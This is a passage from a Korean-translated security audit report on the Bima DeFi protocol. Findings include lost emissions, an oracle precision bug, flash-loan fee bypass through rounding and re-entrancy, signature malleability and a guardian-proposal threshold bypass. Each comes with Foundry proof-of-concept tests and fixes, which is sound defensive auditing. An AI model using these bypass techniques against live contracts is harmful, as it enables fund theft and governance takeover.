    // verify receiver active and last processed week = system week
    (, bool isActive, uint16 updatedWeek) = babelVault.idToReceiver(RECEIVER_ID);
    assertEq(isActive, true);
    assertEq(updatedWeek, systemWeek);

    // however even though BabelVault::unallocatedTotal was reduced by the
    // first week emissions, nothing was allocated to the receiver
    assertEq(allocated, 0);

    // this is because EmissionSchedule::getReceiverWeeklyEmissions calls
    // IncentiveVoting::getReceiverVotePct which looks back 1 week, and receiver
    // had no voting weight and there was no total voting weight at all in that week
    assertEq(incentiveVoting.getTotalWeightAt(systemWeek-1), 0);
    assertEq(incentiveVoting.getReceiverWeightAt(RECEIVER_ID, systemWeek-1), 0);

    // tokens were effectively lost since the vault's unallocated supply decreased
    // but no tokens were actually allocated to receivers since there was no
    // voting weight
}
```

실행: `orge test --match-test test_allocateNewEmissions_unallocatedTokensDecreasedButZeroAllocated`

**Recommended Mitigation:** `BabelVault`와 함께 `EmissionSchedule`을 사용할 계획이라면 가장 안전한 완화 방법은 적어도 한 명의 사용자가 항상 다음을 수행하도록 하는 것입니다:
* `TokenLocker`로 토큰 잠금
* `IncentiveVoting`에 투표 가중치 등록
* 적어도 1명의 배출량 수신자에게 투표

또 다른 옵션은 `EmissionSchedule::getTotalWeeklyEmissions` 코드를 다음과 같이 변경하는 것입니다:
1) `IncentiveVoting::getTotalWeightWrite` 호출
2) `IncentiveVoting::getTotalWeightAt(week-1)`을 호출하여 지난주의 총 가중치 가져오기
3) 지난주의 총 가중치가 0인 경우, `EmissionSchedule::getTotalWeeklyEmissions`는 0을 반환하고 `lockWeeks`와 같은 스토리지를 수정하지 않을 수 있습니다.

이 코드 변경이 시스템의 다른 부분에 의도하지 않은 결과를 초래할 수 있는 위험이 있습니다.

**Bima:**
우리는 적어도 한 명의 사용자가 토큰을 잠그고, 투표 가중치를 등록하고, 적어도 1명의 배출량 수신자에게 투표하도록 하는 첫 번째 완화 방법을 사용할 것입니다.


### Disabled receiver can lose tokens that were allocated for past weeks if not regularly claiming emissions

**Description:** `Vault::setReceiverIsActive`에 의해 수신자가 비활성화되면, 정기적으로 배출량을 청구하지 않은 경우 지난 몇 주 동안 받을 자격이 있었던 토큰을 잃을 수 있습니다.

**Impact:** 비활성화된 수신자는 자격이 있는 토큰을 잃을 수 있습니다.

**Proof of Concept:** 수신자는 `Vault::setReceiverIsActive`를 사용하여 비활성화될 수 있습니다.

```solidity
function setReceiverIsActive(uint256 id, bool isActive) external onlyOwner returns (bool success) {
    // revert if receiver id not associated with an address
    require(idToReceiver[id].account != address(0), "ID not set");

    // update storage - isActive status, address remains the same
    idToReceiver[id].isActive = isActive;

    emit ReceiverIsActiveStatusModified(id, isActive);

    success = true;
}
```

수신자가 `Vault::allocateNewEmissions`를 사용하여 할당된 토큰을 청구할 때, 지난 주 동안 할당된 토큰은 활성 상태인 경우 수신자에게 추가되지만 비활성화된 경우 미할당 공급량으로 환불됩니다.

```solidity
if (receiver.isActive) {
    allocated[msg.sender] += amount;

    emit IncreasedAllocation(msg.sender, amount);
}
// otherwise return allocation to the unallocated supply
else {
    uint256 unallocated = unallocatedTotal + amount;
    unallocatedTotal = SafeCast.toUint128(unallocated);
    ...
}
```

따라서 수신자가 비활성화되면 지난 주 동안 해당 토큰을 받을 자격이 있었음에도 불구하고 지난 주에 할당된 토큰을 청구하지 않으면 토큰을 잃을 수 있습니다.

마찬가지로 수신자가 비활성화되었다가 나중에 활성화되면, 수신자가 `Vault::allocateNewEmissions`를 호출할 때 비활성화되었던 지난 주에 대한 토큰을 받게 됩니다.

**Recommended Mitigation:** 이것이 의도된 동작이 아닌 경우, `Vault::setReceiverIsActive`는 수신자를 비활성화하기 전에 이미 할당된 토큰을 청구해야 합니다. 마찬가지로 이전에 비활성화된 수신자를 활성화할 때, 수신자가 비활성화되었던 지난 주에 대해 토큰이 청구되는 것을 방지하기 위해 수신자의 업데이트된 주를 현재 시스템 주로 설정해야 합니다.

**Bima:**
인정함(Acknowledged).


### `IncentiveVoting::unfreeze` doesn't remove votes if a user has voted with unfrozen weight prior to freezing

**Description:** `IncentiveVoting::unfreeze`는 사용자가 얼리기(freezing) 전에 얼지 않은 가중치로 투표한 경우 투표를 제거하지 않습니다.

**Impact:** 사용자는 `keepIncentivesVote = false`로 잠금을 해제한 후에도 예상치 않게 과거 투표를 유지하게 됩니다.

**Proof of Concept:** `test/foundry/dao/VaultTest.t.sol`에 PoC 함수를 추가하세요:
```solidity
function test_unfreeze_failToRemoveActiveVotes() external {
    // setup vault giving user1 half supply to lock for voting power
    _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // verify user1 has 1 unfrozen lock
    (ITokenLocker.LockData[] memory activeLockData, uint256 frozenAmount)
        = tokenLocker.getAccountActiveLocks(users.user1, 0);
    assertEq(activeLockData.length, 1); // 1 active lock
    assertEq(frozenAmount, 0); // 0 frozen amount
    assertEq(activeLockData[0].amount, 2147483647);
    assertEq(activeLockData[0].weeksToUnlock, 52);

    // register receiver
    uint256 RECEIVER_ID = _vaultRegisterReceiver(address(mockEmissionReceiver), 1);

    // user1 votes for receiver
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = RECEIVER_ID;
    votes[0].points = incentiveVoting.MAX_POINTS();

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // verify user1 has 1 active vote
    votes = incentiveVoting.getAccountCurrentVotes(users.user1);
    assertEq(votes.length, 1);
    assertEq(votes[0].id, RECEIVER_ID);
    assertEq(votes[0].points, 10_000);

    // user1 freezes their lock
    vm.prank(users.user1);
    tokenLocker.freeze();

    // verify user1 has 1 frozen lock
    (activeLockData, frozenAmount) = tokenLocker.getAccountActiveLocks(users.user1, 0);
    assertEq(activeLockData.length, 0); // 0 active lock
    assertGt(frozenAmount, 0); // positive frozen amount

    // user1 unfreezes without keeping their past votes
    vm.prank(users.user1);
    tokenLocker.unfreeze(false); // keepIncentivesVote = false

    // BUT user1 still has 1 active vote which is not an intended design
    votes = incentiveVoting.getAccountCurrentVotes(users.user1);
    assertEq(votes.length, 1);
    assertEq(votes[0].id, RECEIVER_ID);
    assertEq(votes[0].points, 10_000);
}
```

실행: `forge test --match-test test_unfreeze_failToRemoveActiveVotes`

**Recommended Mitigation:** `unfreeze`는 `frozenWeight`가 0이라도 투표를 제거해야 합니다:
```diff
    function unfreeze(address account, bool keepVote) external returns (bool success) {
        // only tokenLocker can call this function
        require(msg.sender == address(tokenLocker));

        // get storage reference to account's lock data
        AccountData storage accountData = accountLockData[account];

        // cache account's frozen weight
        uint256 frozenWeight = accountData.frozenWeight;

-        // if frozenWeight == 0, the account was not registered so nothing needed
        if (frozenWeight > 0) {
            // same as before
        }
+       else if (!keepVote) {
+            // clear previous votes
+            if (accountData.voteLength > 0) {
+                _removeVoteWeights(account, getAccountCurrentVotes(account), 0);
+
+                accountData.voteLength = 0;
+                accountData.points = 0;
+
+                emit ClearedVotes(account, week);
+            }
+        }

        success = true;
    }
```

**Bima:**
커밋 [51a1a94](https://github.com/Bima-Labs/bima-v1-core/commit/51a1a94f06cfab526d2c467f02d71d3e490d470d)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `StorkOracleWrapper` downscales 18 decimal price to 8 decimals then `PriceFeed` upscales to 18 decimals resulting in inaccurate price

**Description:** `StorkOracleWrapper`는 하드코딩된 8 소수점을 반환합니다:
```solidity
function decimals() external pure returns (uint8 dec) {
    dec = 8;
}
```

그리고 해당 함수 `getRoundData`와 `latestRoundData`는 항상 기본 18 소수점 가격을 8 소수점으로 축소합니다:
```solidity
answer = int256(quantizedValue / 1e10);
```

하지만 `PriceFeed`는 항상 오라클 값을 18 소수점으로 변환합니다:
```solidity
uint256 public constant TARGET_DIGITS = 18;

function _scalePriceByDigits(uint256 _price, uint256 _answerDigits) internal pure returns (uint256 scaledPrice) {
    if (_answerDigits == TARGET_DIGITS) {
        scaledPrice = _price;
    } else if (_answerDigits < TARGET_DIGITS) {
        // Scale the returned price value up to target precision
        scaledPrice = _price * (10 ** (TARGET_DIGITS - _answerDigits));
    } else {
        // Scale the returned price value down to target precision
        scaledPrice = _price / (10 ** (_answerDigits - TARGET_DIGITS));
    }
}
```

**Impact:** 프로토콜에서 사용하는 자산 가격은 항상 10 소수점의 정확도를 잃습니다.

**Recommended Mitigation:** `StorkOracleWrapper`는 가격을 8 소수점으로 축소해서는 안 되며, 기본 18 소수점 값을 반환해야 합니다.

**Bima:**
커밋 [d952ac6](https://github.com/Bima-Labs/bima-v1-core/commit/d952ac66cbbdfc7bf752af3a26bed3679cbd15ad)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### No checks for L2 Sequencer being down

**Description:** `PriceFeed.sol` (Chainlink와 작동하도록 설계됨)과 `StorkOracleWrapper` (`PriceFeed`가 Stork 오라클과 작동하도록 생성됨) 모두 L2 시퀀서(Sequencer)가 현재 다운되었는지 확인하는 검사를 구현하지 않습니다.

Arbitrum과 같은 L2 체인에서 Chainlink 또는 다른 오라클을 사용할 때, 스마트 컨트랙트는 최신인 것처럼 보이는 오래된 가격 데이터를 피하기 위해 [L2 시퀀서가 다운되었는지 확인](https://medium.com/Bima-Labs/chainlink-oracle-defi-attacks-93b6cb6541bf#0faf)해야 합니다.

**Impact:** 현재 가격을 반영하지 않는 가격으로 코드가 실행되어 사용자 또는 프로토콜에 잠재적인 자금 손실을 초래할 수 있습니다.

**Recommended Mitigation:** Chainlink의 공식 문서는 L2 시퀀서 확인의 [예제](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-code) 구현을 제공합니다. Stork의 공개적으로 사용 가능한 문서는 그러한 피드를 제공하지 않습니다.

**Bima:**
인정함(Acknowledged); Stork 오라클은 현재 L2 시퀀서 상태 확인을 위한 API를 가지고 있지 않습니다.


### `PriceFeed` will use incorrect price when underlying aggregator reaches `minAnswer`

**Description:** Chainlink 오라클과 작동하도록 설계된 `PriceFeed`는 기본 집계자(aggregator)가 `minAnswer`에 도달하면 잘못된 가격을 사용합니다.

이는 Chainlink 가격 피드에 반환할 최소 및 최대 가격이 내장되어 있기 때문입니다. 예상치 못한 이벤트로 인해 자산의 가치가 가격 피드의 최소 가격 미만으로 떨어지면, [오라클 가격 피드는 (이제 잘못된) 최소 가격을 계속 보고합니다](https://medium.com/Bima-Labs/chainlink-oracle-defi-attacks-93b6cb6541bf#00ac).

**Impact:** 현재 가격을 반영하지 않는 가격으로 코드가 실행되어 사용자/프로토콜에 잠재적인 자금 손실을 초래할 수 있습니다.

**Recommended Mitigation:** `minAnswer < answer < maxAnswer`가 아니면 되돌리세요(Revert). 또한 Stork 오라클(`StorkOracleWrapper`를 통해 `PriceFeed`와 함께 사용될 수 있음)은 이 상황에서의 자체 동작에 대한 공개적으로 사용 가능한 문서가 없으므로 이에 대해 문의하는 것이 좋습니다.

**Bima:**
우리는 Chainlink가 아닌 Stork 오라클만 `PriceFeed`와 함께 사용할 것이며, Stork 오라클에는 min/max 값이 없습니다.


### Some `TroveManager` debt emission rewards can be lost

**Description:** `TroveManager`는 사용자가 투표할 경우 `BabelVault`로부터 토큰 배출 보상을 받을 수 있으며, 이러한 보상은 부채 또는 민팅(minting)에 따라 사용자에게 분배됩니다.

모든 배출량이 `TroveManager` 부채 ID로 이동하는 단위 테스트 시나리오를 만들 때, 모든 배출량이 트로브를 개설한 사용자에게 분배되는 것으로 보이지는 않습니다.

**Impact:** `TroveManager`에 할당된 주간 토큰 배출량의 전부가 트로브를 개설한 사용자에게 분배되는 것은 아닙니다. 일부 금액은 전혀 분배되지 않고 사실상 손실됩니다.

**Proof of Concept:** PoC를 `test/foundry/core/BorrowerOperationsTest.t.sol`에 추가하세요:
```solidity
function test_claimReward_someTroveManagerDebtRewardsLost() external {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // owner registers TroveManager for vault emission rewards
    vm.prank(users.owner);
    babelVault.registerReceiver(address(stakedBTCTroveMgr), 2);

    // user votes for TroveManager debtId to get emissions
    (uint16 TM_RECEIVER_DEBT_ID, /*uint16 TM_RECEIVER_MINT_ID*/) = stakedBTCTroveMgr.emissionId();

    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](1);
    votes[0].id = TM_RECEIVER_DEBT_ID;
    votes[0].points = incentiveVoting.MAX_POINTS();

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // user1 and user2 open a trove with 1 BTC collateral for their max borrowing power
    uint256 collateralAmount = 1e18;
    uint256 debtAmountMax
        = ((collateralAmount * _getScaledOraclePrice() / borrowerOps.CCR())
          - INIT_GAS_COMPENSATION);

    _openTrove(users.user1, collateralAmount, debtAmountMax);
    _openTrove(users.user2, collateralAmount, debtAmountMax);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // calculate expected first week emissions
    uint256 firstWeekEmissions = initialUnallocated*INIT_ES_WEEKLY_PCT/BIMA_100_PCT;
    assertEq(firstWeekEmissions, 536870911875000000000000000);
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // no rewards in the same week as emissions
    assertEq(stakedBTCTroveMgr.claimableReward(users.user1), 0);
    assertEq(stakedBTCTroveMgr.claimableReward(users.user2), 0);

    vm.prank(users.user1);
    uint256 userReward = stakedBTCTroveMgr.claimReward(users.user1);
    assertEq(userReward, 0);
    vm.prank(users.user2);
    userReward = stakedBTCTroveMgr.claimReward(users.user2);
    assertEq(userReward, 0);

    // verify emissions correctly set in BabelVault for first week
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // rewards for the first week can be claimed now
    // users receive less?
    assertEq(firstWeekEmissions/2, 268435455937500000000000000);
    uint256 actualUserReward =     263490076563008042796633412;

    assertEq(stakedBTCTroveMgr.claimableReward(users.user1), actualUserReward);
    assertEq(stakedBTCTroveMgr.claimableReward(users.user2), actualUserReward);

    // verify user1 rewards
    vm.prank(users.user1);
    userReward = stakedBTCTroveMgr.claimReward(users.user1);
    assertEq(userReward, actualUserReward);

    // verify user2 rewards
    vm.prank(users.user2);
    userReward = stakedBTCTroveMgr.claimReward(users.user2);
    assertEq(userReward, actualUserReward);

    // firstWeekEmissions = 536870911875000000000000000
    // userReward * 2     = 526980153126016085593266824
    //
    // some rewards were not distributed and are effectively lost

    // if either users tries to claim again, nothing is returned
    assertEq(stakedBTCTroveMgr.claimableReward(users.user1), 0);
    assertEq(stakedBTCTroveMgr.claimableReward(users.user2), 0);

    vm.prank(users.user1);
    userReward = stakedBTCTroveMgr.claimReward(users.user1);
    assertEq(userReward, 0);
    vm.prank(users.user2);
    userReward = stakedBTCTroveMgr.claimReward(users.user2);
    assertEq(userReward, 0);

    // refresh mock oracle to prevent frozen feed revert
    mockOracle.refresh();

    // user2 closes their trove
    vm.prank(users.user2);
    borrowerOps.closeTrove(stakedBTCTroveMgr, users.user2);

    uint256 secondWeekEmissions = (initialUnallocated - firstWeekEmissions)*INIT_ES_WEEKLY_PCT/BIMA_100_PCT;
    assertEq(secondWeekEmissions, 402653183906250000000000000);
    assertEq(babelVault.weeklyEmissions(systemWeek + 1), secondWeekEmissions);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // user2 can't claim anything as they withdrew
    assertEq(stakedBTCTroveMgr.claimableReward(users.user2), 0);
    vm.prank(users.user2);
    userReward = stakedBTCTroveMgr.claimReward(users.user2);
    assertEq(userReward, 0);

    // user1 gets almost all the weekly emissions apart
    // from an amount that is lost
    actualUserReward = 388085427183354818500070297;
    assertEq(stakedBTCTroveMgr.claimableReward(users.user1), actualUserReward);

    vm.prank(users.user1);
    userReward = stakedBTCTroveMgr.claimReward(users.user1);
    assertEq(userReward, actualUserReward);

    // weekly emissions 402653183906250000000000000
    // user1 received   388085427183354818500070297

    // user1 can't claim more rewards
    assertEq(stakedBTCTroveMgr.claimableReward(users.user1), 0);
    vm.prank(users.user1);
    userReward = stakedBTCTroveMgr.claimReward(users.user1);
    assertEq(userReward, 0);
}
```

실행: `forge test --match-contract BorrowerOperationsTest --match-test test_claimReward_someTroveManagerDebtRewardsLost`

**Recommended Mitigation:** 이 문제는 누락된 테스트 모음 커버리지를 채울 때 감사 종료 시점에 발견되었으므로, 원인은 아직 확인되지 않았으며 프로토콜 팀이 테스트 모음을 사용하여 조사해야 할 부분으로 남아 있습니다. 문제를 예방하는 한 가지 방법은 `BabelVault`에서 `TroveManager` 부채 ID 배출 보상을 활성화하지 않는 것입니다. 동일한 문제가 `TroveManager` mintId 보상에 영향을 미칠 수 있습니다.

**Bima:**
인정함(Acknowledged).

\clearpage
## Low Risk


### Implementation contracts should inherit from their interfaces enabling compile-time checks ensuring implementations correctly implement their interfaces

**Description:** 구현(Implementation) 컨트랙트는 인터페이스를 상속하지 않아 인터페이스가 올바르게 구현되었는지 확인하는 컴파일 타임 검사를 방지합니다. 또한 인터페이스와 구현에는 복사 및 붙여넣기로 인한 중복 정의가 많이 포함되어 있습니다.

예를 들어, 다음을 [포함하는](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/interfaces/IPriceFeed.sol#L12-L42) 인터페이스 `IPriceFeed.sol`을 살펴보세요:
```solidity
function setOracle(
    address _token,
    address _chainlinkOracle,
    bytes4 sharePriceSignature,
    uint8 sharePriceDecimals,
    bool _isEthIndexed
) external;

function RESPONSE_TIMEOUT() external view returns (uint256);

function oracleRecords(
    address
)
    external
    view
    returns (
        address chainLinkOracle,
        uint8 decimals,
        bytes4 sharePriceSignature,
        uint8 sharePriceDecimals,
        bool isFeedWorking,
        bool isEthIndexed
    );
```

그런 다음 `IPriceFeed` 인터페이스를 올바르게 구현하지 못한 구현체 `PriceFeed.sol` ([1](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/PriceFeed.sol#L17-L25), [2](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/PriceFeed.sol#L60), [3](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/PriceFeed.sol#L85-L92))을 살펴보세요:
```solidity
struct OracleRecord {
    IAggregatorV3Interface chainLinkOracle;
    uint8 decimals;
    // @audit extra `heartbeat` members breaks interface `IPriceFeed::oracleRecords`
    uint32 heartbeat;
    bytes4 sharePriceSignature;
    uint8 sharePriceDecimals;
    bool isFeedWorking;
    bool isEthIndexed;

// @audit different name breaks interface `IPriceFeed::RESPONSE_TIMEOUT`
uint256 public constant RESPONSE_TIMEOUT_BUFFER = 1 hours;

function setOracle(
    address _token,
    address _chainlinkOracle,
    // @audit extra `heartbeat` members breaks interface `IPriceFeed::setOracle`
    uint32 _heartbeat,
    bytes4 sharePriceSignature,
    uint8 sharePriceDecimals,
    bool _isEthIndexed
) public onlyOwner {
}
```

**Impact:** 인터페이스에 `_heartbeat` 매개변수가 누락되어 있어 `IPriceFeed::setOracle` 호출을 시도하면 revert 됩니다. 마찬가지로 `IPriceFeed::oracleRecords`를 호출해도 같은 이유로 revert 되며, `IPriceFeed::RESPONSE_TIMEOUT`을 호출하면 구현체가 변수 이름이 다르기 때문에 revert 됩니다.

**Recommended Mitigation:** 구현 컨트랙트는 인터페이스를 상속해야 합니다.

**Bima:**
우리가 제어하지 않는 외부 라이브러리의 인터페이스에 의존하는 `DebtToken` 및 `BabelToken`을 제외한 모든 컨트랙트에 대해 [PR39](https://github.com/Bima-Labs/bima-v1-core/pull/39)에서 수정되었습니다.

**Cyfrin:** 해결되었습니다.


### `DebtToken::flashLoan` fees can be bypassed by borrowing in small amounts

**Description:** `DebtToken::flashLoan` 수수료는 수수료 계산 시 [0으로 내림](https://dacian.me/precision-loss-errors#heading-rounding-down-to-zero)되는 정밀도 손실을 유발하기 위해 소액을 빌리는 방식으로 우회할 수 있습니다. 이 함수는 재진입을 허용하므로, 0의 수수료로 더 많은 금액을 빌리기 위해 함수에 여러 번 재진입할 수 있습니다.

**Impact:** 플래시 론 수수료를 우회할 수 있습니다.

**Proof of Concept:** 다음 테스트 컨트랙트를 `test/foundry/core/DebtTokenTest.t.sol`에 추가하세요:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

// test setup
import {TestSetup, DebtToken} from "../TestSetup.sol";

contract DebtTokenTest is TestSetup {

    function test_flashLoan() external {
        // entire supply initially available to borrow
        assertEq(debtToken.maxFlashLoan(address(debtToken)), type(uint256).max);

        // expected fee for borrowing 1e18
        uint256 borrowAmount = 1e18;
        uint256 expectedFee  = borrowAmount * debtToken.FLASH_LOAN_FEE() / 10000;

        // fee should be > 0
        assertTrue(expectedFee > 0);

        // fee should exactly equal
        assertEq(debtToken.flashFee(address(debtToken), borrowAmount), expectedFee);

        // exploit rounding down to zero precision loss to get free flash loans
        // by borrowing in small amounts
        borrowAmount = 1111;
        assertEq(debtToken.flashFee(address(debtToken), borrowAmount), 0);

        // as DebtToken::flashLoan allows re-entrancy, the function can be re-entered
        // multiple times to borrow larger amounts at zero fee
    }
}
```

실행: `forge test --match-test test_flashLoan`

**Recommended Mitigation:** 계산된 수수료가 0인 경우 `DebtToken::_flashFee`가 revert 되어야 합니다:
```solidity
function _flashFee(uint256 amount) internal pure returns (uint256 fee) {
    fee = (amount * FLASH_LOAN_FEE) / 10000;
    require(fee > 0, "ERC20FlashMint: amount too small");
}
```

**Bima:**
커밋 [ddab178](https://github.com/Bima-Labs/bima-v1-core/commit/ddab178ec663f774b4f50f8ae3414988e6d25552)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Using `ecrecover` directly vulnerable to signature malleability

**Description:** `DebtToken::permit` 및 `BabelToken::permit`은 `ecrecover`를 직접 호출하지만, 타원 곡선의 대칭적인 특성으로 인해 모든 `[v,r,s]`에 대해 동일한 유효한 결과를 반환하는 또 다른 `[v,r,s]`가 존재합니다.

**Impact:** `ecrecover`를 직접 사용하면 [서명 변형성(signature malleability)](https://dacian.me/signature-replay-attacks#heading-signature-malleability)에 취약합니다.

**Recommended Mitigation:** 버전 >= 4.7.3인 OpenZeppelin의 [ECDSA](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol) 라이브러리를 사용하세요.

**Bima:**
커밋 [343a449](https://github.com/Bima-Labs/bima-v1-core/commit/343a44900a9cc03d85c344d01e580eaa8a8dc098)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Proposal creation bypasses minimum voting weight requirement when no tokens are locked hence no voting power exists

**Description:** `AdminVoting::minCreateProposalPct`는 제안을 생성하는 데 필요한 최소 투표 가중치를 지정하지만, 토큰이 잠겨 있지 않아 투표권이 존재하지 않을 때 누구나 제안을 생성할 수 있도록 이것이 우회됩니다.

**Proof of Concept:** 먼저 `test/foundry/TestSetup.sol`을 변경하여 `setUp`에서 시간을 앞으로 이동시키세요:
```solidity
function setUp() public virtual {
    // prevent Foundry from setting block.timestamp = 1 which can cause
    // errors in this protocol
    vm.warp(1659973223);
```

그런 다음 다음 테스트 컨트랙트를 `/test/foundry/dao/AdminVotingTest.t.sol`에 추가하세요:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {AdminVoting} from "../../../contracts/dao/AdminVoting.sol";

// test setup
import {TestSetup} from "../TestSetup.sol";

contract AdminVotingTest is TestSetup {
    AdminVoting adminVoting;

    uint256 constant internal INIT_MIN_CREATE_PROP_PCT = 10;   // 0.01%
    uint256 constant internal INIT_PROP_PASSING_PCT    = 2000; // 20%

    function setUp() public virtual override {
        super.setUp();

        adminVoting = new AdminVoting(address(babelCore),
                                      tokenLocker,
                                      INIT_MIN_CREATE_PROP_PCT,
                                      INIT_PROP_PASSING_PCT);
    }

    function test_constructor() external view {
        // parameters correctly set
        assertEq(adminVoting.minCreateProposalPct(), INIT_MIN_CREATE_PROP_PCT);
        assertEq(adminVoting.passingPct(), INIT_PROP_PASSING_PCT);
        assertEq(address(adminVoting.tokenLocker()), address(tokenLocker));

        // week initialized to zero
        assertEq(adminVoting.getWeek(), 0);
        assertEq(adminVoting.minCreateProposalWeight(), 0);

        // no proposals
        assertEq(adminVoting.getProposalCount(), 0);
    }

    function test_createNewProposal_inInitialState() external {
        // create dummy proposal
        AdminVoting.Action[] memory payload = new AdminVoting.Action[](1);
        payload[0].target = address(0x0);
        payload[0].data   = abi.encode("");

        uint256 lastProposalTimestamp = adminVoting.latestProposalTimestamp(users.user1);
        assertEq(lastProposalTimestamp, 0);

        // verify expected failure condition
        vm.startPrank(users.user1);
        vm.expectRevert("No proposals in first week");
        adminVoting.createNewProposal(users.user1, payload);

        // advance time by 1 week
        vm.warp(block.timestamp + 1 weeks);
        uint256 weekNum = 1;
        assertEq(adminVoting.getWeek(), weekNum);

        // verify there are no tokens locked
        assertEq(tokenLocker.getTotalWeightAt(weekNum), 0);

        // even though there are no tokens locked so users have no voting weight,
        // a user with no voting weight can still create a proposal!
        adminVoting.createNewProposal(users.user1, payload);
        vm.stopPrank();

        // verify proposal has been created
        assertEq(adminVoting.getProposalCount(), 1);

        // attempting to execute the proposal fails with correct error
        uint256 proposalId = 0;
        vm.expectRevert("Not passed");
        adminVoting.executeProposal(proposalId);

        // attempting to vote on the proposal fails with correct error
        vm.expectRevert("No vote weight");
        vm.prank(users.user1);
        adminVoting.voteForProposal(users.user1, proposalId, 0);

        // so this can't be exploited further
    }
}
```

실행: `forge test --match-contract AdminVotingTest`.

**Recommended Mitigation:** 주어진 주(week)에 총 투표 가중치가 없을 때 `AdminVoting::minCreateProposalWeight`가 revert 되도록 변경하여 제안 생성을 방지하세요:
```diff
    function minCreateProposalWeight() public view returns (uint256) {
        uint256 week = getWeek();
        if (week == 0) return 0;
        week -= 1;

        uint256 totalWeight = tokenLocker.getTotalWeightAt(week);
+       require(totalWeight > 0, "Zero total voting weight for given week");

        return (totalWeight * minCreateProposalPct) / MAX_PCT;
    }
```

**Bima:**
커밋 [2452681](https://github.com/Bima-Labs/bima-v1-core/commit/24526810c53c068955ad5ae166d7bd98f19ffc77)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Easily bypass `setGuardian` proposal passing requirement

**Description:** `AdminVoting::createNewProposal`은 `_isSetGuardianPayload`를 호출하여 제안에 `IBabelCore.setGuardian` 호출이 포함되어 있는지 감지합니다. `true`인 경우 `setGuardian` 제안이 성공하려면 50.1%의 과반수가 필요하며, 그렇지 않으면 더 낮을 것으로 예상되는 구성된 제안 통과 비율을 사용합니다.

그러나 이는 페이로드가 1개만 있고 해당 페이로드가 `IBabelCore.setGuardian`을 호출하는 경우에만 작동합니다. 악의적인 행위자는 아무것도 하지 않는 두 번째 페이로드가 있는 제안을 생성하여 이를 쉽게 우회할 수 있습니다.

**Impact:** 악의적인 행위자는 `setGuardian` 제안에 대한 50.1% 과반수 요건을 우회하여 더 낮은 통과 비율로 통과될 수 있는 악의적인 `setGuardian` 제안을 쉽게 생성할 수 있습니다.

**Proof of Concept:** PoC 함수를 `test/foundry/dao/AdminVotingTest.t.sol`에 추가하세요:
```solidity
function test_createNewProposal_setGuardian() external {
    // create a setGuardian proposal that also contains a dummy proposal
    AdminVoting.Action[] memory payload = new AdminVoting.Action[](2);
    payload[0].target = address(0x0);
    payload[0].data   = abi.encode("");
    payload[1].target = address(babelCore);
    payload[1].data   = abi.encodeWithSelector(IBabelCore.setGuardian.selector, users.user1);

    // lock up user tokens to receive voting power
    vm.prank(users.user1);
    tokenLocker.lock(users.user1, INIT_BAB_TKN_TOTAL_SUPPLY, 52);

    // warp forward BOOTSTRAP_PERIOD so voting power becomes active
    // and setGuardian proposals are allowed
    vm.warp(block.timestamp + adminVoting.BOOTSTRAP_PERIOD());

    // create the proposal
    vm.prank(users.user1);
    adminVoting.createNewProposal(users.user1, payload);

    // verify requiredWeight is 50.1% majority for setGuardian proposals
    assertEq(adminVoting.getProposalRequiredWeight(0),
             (tokenLocker.getTotalWeight() * adminVoting.SET_GUARDIAN_PASSING_PCT()) /
             adminVoting.MAX_PCT());

    // fails since the first dummy payload evaded detection of the
    // second setGuardian payload
}
```

실행: `forge test --match-test test_createNewProposal_setGuardian`

**Recommended Mitigation:** `AdminVoting::_isSetGuardianPayload`의 이름을 `_containsSetGuardianPayload`로 변경하고 페이로드의 모든 요소를 반복하도록 하세요; 페이로드 요소 중 하나라도 `IBabelCore.setGuardian` 호출을 포함하면 해당 제안에 대해 50.1% 요구 사항을 적용해야 합니다:
```solidity
function _containsSetGuardianPayload(uint256 payloadLength, Action[] memory payload) internal view returns (bool) {
    for(uint256 i; i<payloadLength; i++) {
        bytes memory data = payload[i].data;

        // Extract the call sig from payload data
        bytes4 sig;
        assembly {
            sig := mload(add(data, 0x20))
        }

        if(sig == IBabelCore.setGuardian.selector) return true;
    }

    return false;
}
```

**Bima:**
커밋 [0e4e2c8](https://github.com/Bima-Labs/bima-v1-core/commit/0e4e2c8d2a54dc04db67edd28cb9fcf84ff0cda0)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Don't allow cancellation of executed or cancelled proposals

**Description:** `AdminVoting::cancelProposal` 및 `InterimAdmin::cancelProposal`은 실행되었거나 취소된 제안의 취소를 허용하는데, 이는 논리적으로 타당하지 않으며 보호자(guardian)에게 제안의 정확한 상태에 대해 혼동을 줄 수 있습니다.

**Recommended Mitigation:** 실행되었거나 이미 취소된 제안의 취소를 방지하세요:
```diff
function cancelProposal(uint256 id) external {
